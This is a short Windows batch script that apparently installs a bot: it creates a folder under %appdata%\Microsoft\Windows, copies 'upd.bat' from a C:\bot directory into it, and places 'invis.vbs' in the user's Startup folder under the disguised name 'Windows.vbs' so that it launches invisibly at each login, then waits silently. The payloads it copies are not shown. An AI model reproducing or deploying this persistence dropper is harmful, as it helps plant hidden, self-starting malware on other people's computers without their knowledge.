@ECHO off

cd "%appdata%\Microsoft\Windows" && mkdir "Cmd"

copy "C:\bot\upd.bat" "%appdata%\Microsoft\Windows\Cmd\upd.bat"
copy "C:\bot\invis.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows.vbs"


pause > nul